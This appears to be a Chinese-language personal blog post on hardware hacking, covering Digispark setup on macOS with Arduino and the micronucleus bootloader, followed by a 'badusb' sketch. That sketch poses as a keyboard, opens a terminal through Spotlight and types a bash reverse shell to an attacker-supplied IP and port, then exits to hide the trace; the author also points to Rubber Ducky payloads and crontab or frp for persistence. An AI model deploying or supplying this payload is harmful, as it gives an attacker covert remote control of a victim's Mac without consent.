---
title: "硬件"
date: 2021-10-10T17:42:32+08:00
lastmod: 2021-10-10T17:42:32+08:00
draft: false
keywords: []
description: ""
tags: [hardware]
categories: []
author: "lttzz"

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: true
autoCollapseToc: true
postMetaInFooter: false
hiddenFromHomePage: false
# You can also define another contentCopyright. e.g. contentCopyright: "This is another copyright."
contentCopyright: false
reward: false
mathjax: false
mathjaxEnableSingleDollar: false
mathjaxEnableAutoNumber: false

# You unlisted posts you might want not want the header or footer to show
hideHeaderAndFooter: false

# You can enable or disable out-of-date content warning for individual post.
# Comment this out to use the global config.
#enableOutdatedInfoWarning: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

<!--more-->

# USB

## Digispark

### 0x00 Preknowledge

+ [Connecting and Programming Your Digispark](http://digistump.com/wiki/digispark/tutorials/connecting)



``` bash
# Arduino
Arduino: 1.8.16 (Mac OS X), Board: "Digispark (Default - 16.5mhz)"


fork/exec /Users/lttzz/Library/Arduino15/packages/arduino/tools/avr-gcc/4.8.1-arduino5/bin/avr-g++: no such file or directory
Error compiling for board Digispark (Default - 16.5mhz).


This report would have more information with
"Show verbose output during compilation"
option enabled in File -> Preferences.



# 上来就劝退啊
# http://digistump.com/board/index.php?topic=3198.0
# https://digistump.com/board/index.php?topic=3249.0
$ cd ~/Library/Arduino15/packages/arduino/tools/avr-gcc
$ mv 4.8.1-arduino5 orig.4.8.1
$ ln -s /Applications/Arduino.app/Contents/Java/hardware/tools/avr 4.8.1-arduino5 
```

macOS识别不出来，无法直接Arduino烧录，故而需要使用 [bootloader](https://github.com/micronucleus/micronucleus)，尽量不要使用 usb hub。

``` bash
$ ./micronucleus sketch_oct21a.ino.hex
> Please plug in the device ...
> Device is found!
connecting: 40% complete
> Device has firmware version 2.5
> Device signature: 0x1e930b
> Available space for user applications: 6586 bytes
> Suggested sleep time between sending pages: 7ms
> Whole page count: 103  page size: 64
> Erase function sleep duration: 721ms
parsing: 60% complete
> Erasing the memory ...
erasing: 80% complete
> Starting to upload ...
writing: 100% complete
>> Micronucleus done. Thank you!
```

找不到hex文件的，Arduino Preference 里把 verbose output 开启。

![](/Picbed/2021_10/1021_00.png)

### badusb

麻了，谁说Arduino无脑的，`#inclulde <Keyboard.h>` 能给我报找不到 `HID.h` 。

``` c++
#include "DigiKeyboard.h"

void setup()
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // call spotlight
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);

  // open terminal
  DigiKeyboard.print("iterm");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  DigiKeyboard.print("bash");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // reverse shell
  DigiKeyboard.print("bash -i >& /dev/tcp/{ip}/{port} 0>&1&");  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // exit
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);  

  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop()
{
  digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
  digitalWrite(1, HIGH);
  delay(500);               // wait for a second
  digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
  digitalWrite(1, LOW); 
  delay(500);               // wait for a second
}
```

[Rubber-ducky payloads](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads)

crontab/frp之类的就可以搞一搞啦。

# WIFI

## esp8266

macOS插入不识别，咕咕咕。
